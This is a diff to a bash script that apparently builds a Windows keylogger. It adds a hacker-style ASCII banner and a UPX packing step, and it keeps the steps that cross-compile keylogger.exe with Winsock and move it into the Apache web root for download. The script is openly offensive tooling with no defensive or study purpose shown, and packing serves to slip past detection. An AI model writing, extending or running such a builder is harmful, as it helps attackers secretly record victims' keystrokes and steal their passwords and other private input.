@@ -8,7 +8,21 @@ display_banner() {
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
   echo -e "\e[93m"
- 
+  echo -e "        █████╗ ███╗   ██╗██╗  ██╗ ██████╗ ███╗   ███╗"
+  echo -e "       ██╔══██╗████╗  ██║██║  ██║██╔═══██╗████╗ ████║"
+  echo -e "       ███████║██╔██╗ ██║███████║██║   ██║██╔████╔██║"
+  echo -e "       ██╔══██║██║╚██╗██║██╔══██║██║   ██║██║╚██╔╝██║"
+  echo -e "       ██║  ██║██║ ╚████║██║  ██║╚██████╔╝██║ ╚═╝ ██║"
+  echo -e "       ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
+  echo -e "                       \e[91mAnonymously Yours\e[0m"
+  echo -e "\e[93m"
+  echo -e "        ███╗   ███╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗"
+  echo -e "        ████╗ ████║██╔══██╗████╗ ████║██╔════╝██║ ██╔╝"
+  echo -e "        ██╔████╔██║███████║██╔████╔██║██║     █████╔╝ "
+  echo -e "        ██║╚██╔╝██║██╔══██║██║╚██╗██║██║     ██╔═██╗ "
+  echo -e "        ██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╗██║  ██╗"
+  echo -e "        ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝"
+  echo -e "\e[0m"
 }
 
 # Default values
@@ -34,7 +48,10 @@ generate_keylogger() {
   echo "Compiling the C++ code..."
   x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32
 
-  echo "Compilation completed. The keylogger executable is keylogger.exe"
+  echo "Packing the executable with UPX..."
+  upx --best --lzma keylogger.exe
+
+  echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
 
   echo "Moving the keylogger executable to the Apache server directory..."
   sudo mv keylogger.exe /var/www/html/
@@ -54,7 +71,7 @@ start_server() {
 # Ensure the system is updated and install necessary packages
 echo "Updating system and installing necessary packages..."
 sudo apt-get update
-sudo apt-get install -y mingw-w64 python3 apache2 git
+sudo apt-get install -y mingw-w64 python3 apache2 git upx
 
 # Display the banner
 display_banner
